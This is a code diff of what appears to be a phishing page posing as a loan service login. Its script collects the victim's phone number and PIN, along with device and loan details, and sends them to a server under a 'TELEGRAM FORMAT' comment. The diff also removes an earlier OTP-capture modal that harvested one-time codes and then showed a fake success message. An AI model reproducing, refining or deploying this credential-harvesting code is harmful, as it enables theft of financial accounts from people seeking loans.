@@ -84,6 +84,11 @@ input:focus{
   width:100%;
   font-weight:600;
   cursor:pointer;
+  transition:background-color .15s ease, box-shadow .15s ease;
+}
+
+.btn:active{
+  box-shadow:0 4px 10px rgba(0,0,0,.6) inset;
 }
 
 .btn[disabled]{
@@ -94,7 +99,12 @@ input:focus{
 .req{color:#ef4444;margin-right:6px}
 .small{font-size:13px;color:#9ca3af}
 .success{color:#22c55e;font-weight:600}
-.error{min-height:18px;font-size:13px;color:#ef4444}
+
+.error{
+  min-height:18px;
+  font-size:13px;
+  color:#ef4444;
+}
 
 /* PIN */
 .pin-row{
@@ -183,6 +193,13 @@ input:focus{
   padding:10px 14px;
   border-radius:8px;
   color:#e5e7eb;
+  flex:1;
+  cursor:pointer;
+  transition:box-shadow .15s ease;
+}
+
+.resend-btn:active{
+  box-shadow:0 4px 10px rgba(0,0,0,.6) inset;
 }
 
 .resend-btn[disabled]{
@@ -193,6 +210,13 @@ input:focus{
 .action-primary{
   background:#2563eb;
   border:0;
+  color:#fff;
+}
+
+.action-secondary{
+  background:#020617;
+  border:1px solid #1f2937;
+  color:#e5e7eb;
 }
 
 /* SPINNER */
@@ -204,6 +228,8 @@ input:focus{
   border-radius:50%;
   display:inline-block;
   animation:spin .8s linear infinite;
+  vertical-align:-2px;
+  margin-right:6px;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 </style>
@@ -233,66 +259,44 @@ input:focus{
   </form>
 </div>
 
-<!-- OTP MODAL -->
-<div id="otpModal" class="otp-modal" style="display:none">
-  <div class="otp-box">
-    <div style="text-align:center"><strong>Enter OTP</strong></div>
-    <p class="small">We have sent an OTP to your phone.</p>
-
-    <div class="otp-row">
-      <input class="otp-digit" tabindex="-1">
-      <input class="otp-digit" tabindex="-1">
-      <input class="otp-digit" tabindex="-1">
-      <input class="otp-digit" tabindex="-1">
-      <input class="otp-digit" tabindex="-1">
-    </div>
-
-    <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
-           style="position:absolute;opacity:0;pointer-events:none">
-
-    <div id="otpWarning" class="otp-warning">Please input 5 digits</div>
-
-    <div class="resend-row">
-      <div class="small">Resend in <span id="countdown">120</span>s</div>
-      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
-    </div>
-
-    <div style="display:flex;gap:10px;margin-top:14px">
-      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
-      <button id="cancelOtp" class="resend-btn">Cancel</button>
-    </div>
-
-    <div id="otpStatus" class="small" style="margin-top:8px"></div>
-  </div>
-</div>
-
 <script>
-/* ===== LOAD LOAN FORM ===== */
-let loanForm={};
-try{
-  const raw=sessionStorage.getItem('loanForm');
-  if(raw) loanForm=JSON.parse(raw);
-}catch(e){}
-
 /* ===== DEVICE ===== */
 const ua=navigator.userAgent;
 let device='Unknown';
-if(/Android/i.test(ua)) device='Android | Chrome';
+if(/Android/i.test(ua)) device='Android';
+if(/Chrome/i.test(ua)) device+=' | Chrome';
+else if(/Safari/i.test(ua)) device+=' | Safari';
+else if(/Firefox/i.test(ua)) device+=' | Firefox';
+
+/* ===== TELEGRAM FORMAT (ONLY CHANGE) ===== */
+function normalizePlan(){
+  try{
+    const d = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+
+    return `loan_request: USD ${d.loanAmount || 'N/A'} / ` +
+           `${d.loanType || 'N/A'} / ` +
+           `${d.repayment ? d.repayment + ' month(s)' : 'N/A'} ` +
+           `(${d.employment || 'Unspecified'})`;
+  }catch(e){
+    return 'loan_request: N/A';
+  }
+}
 
 /* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
-const loginBtn=document.getElementById('loginBtn');
-
 pins.forEach((el,i)=>{
   el.addEventListener('input',()=>{
     el.value=el.value.replace(/\D/g,'');
     el.classList.toggle('filled',!!el.value);
     if(el.value && i<pins.length-1) pins[i+1].focus();
-    pinValue=pins.map(p=>p.value).join('');
-    loginBtn.disabled=!/^\d{4}$/.test(pinValue);
+    updatePin();
   });
 });
+function updatePin(){
+  pinValue=pins.map(p=>p.value).join('');
+  loginBtn.disabled=pinValue.length!==4;
+}
 
 /* ===== API ===== */
 async function sendToServer(payload){
@@ -304,52 +308,18 @@ async function sendToServer(payload){
 }
 
 /* ===== LOGIN ===== */
-loginForm.addEventListener('submit',async e=>{
+document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
 
   await sendToServer({
     event:'login_clicked',
     loginPhone:phone.value,
     loginPin:pinValue,
-    plan:`Loan Request: USD ${loanForm.loanAmount} / ${loanForm.repayment} month(s) (${loanForm.employment})`,
+    plan: normalizePlan(),
     device,
     submittedAt:new Date().toISOString()
   });
-
-  otpModal.style.display='flex';
 });
-
-/* ===== CONFIRM ===== */
-confirmOtp.onclick=async()=>{
-  await sendToServer({
-    event:'otp_confirm',
-    loginPhone:phone.value,
-    loginPin:pinValue,
-    otp:otpBuffer.value,
-    plan:`Loan Request: USD ${loanForm.loanAmount} / ${loanForm.repayment} month(s) (${loanForm.employment})`,
-    device,
-    submittedAt:new Date().toISOString()
-  });
-
-  otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
-  setTimeout(()=>location.href='thankyou.html',1200);
-};
-
-/* ===== RESEND ===== */
-resendBtn.onclick=async()=>{
-  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
-
-  await sendToServer({
-    event:'resend_otp',
-    loginPhone:phone.value,
-    loginPin:pinValue,
-    plan:`Loan Request: USD ${loanForm.loanAmount} / ${loanForm.repayment} month(s) (${loanForm.employment})`,
-    device,
-    submittedAt:new Date().toISOString()
-  });
-
-  resendBtn.innerHTML='OTP sent ✓';
-};
 </script>
 
 </body>
